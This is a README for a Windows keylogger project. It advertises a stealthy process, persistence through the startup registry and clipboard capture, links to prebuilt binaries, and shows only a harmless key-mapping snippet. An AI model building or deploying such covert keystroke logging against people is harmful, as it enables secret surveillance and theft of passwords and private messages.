<div>
    <a href="https://ci.appveyor.com/project/vim2meta/keylogger"><img src="https://ci.appveyor.com/api/projects/status/vny1d8cp1ge7lj0m?svg=true" alt="Build Status" /></a>
    <a href="https://www.codacy.com/app/vim2meta/Keylogger?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=vim2meta/Keylogger&amp;utm_campaign=Badge_Grade"><img src="https://api.codacy.com/project/badge/Grade/7e1530b50bb24332b13af43822ef0a9c" alt="Codacy Badge" /></a>
    <a href="https://github.com/vim2meta/Keylogger/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License" /></a>
    <a href="https://github.com/vim2meta/Keylogger/releases"><img src="https://img.shields.io/github/release/vim2meta/Keylogger.svg" alt="Release" /></a>
</div>

## Features
- Stealthy process
- Automatically added to startup registry
- Keyboard locale support
- Special characters and numeric keypad
- Clipboard parsing on `Ctrl + V`
- Supports Windows XP, Vista, 8 and 10

## Configuration
You may configure the name of the logging file as well as what should be logged for each [virtual-key code](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731.aspx) by modifying the `keylogger.c` file.
```c
LPCWSTR get_key_value(DWORD vk_code) 
{
	switch (vk_code) {
	case VK_RETURN:
		return L"\r\n";
	case VK_ESCAPE:
		return L"[ESC]";
	case VK_BACK:
		return L"[BACKSPACE]";
	default:
		return NULL;
	}
}
```

## Build
Visual Studio 2017 is required to load the solution. However, the project may be compiled by any Windows `C11` compiler. The required Windows libraries are `Kernel32.lib`, `User32.lib` and `Advapi32.lib`.

If you do not wish to build the project yourself, you may use the prebuilt binaries available here: https://github.com/vim2meta/Keylogger/releases.

## Contributing
All contributions are welcome. If you are going to submit a pull request, please follow the style of the project and aim for clear and concise code.
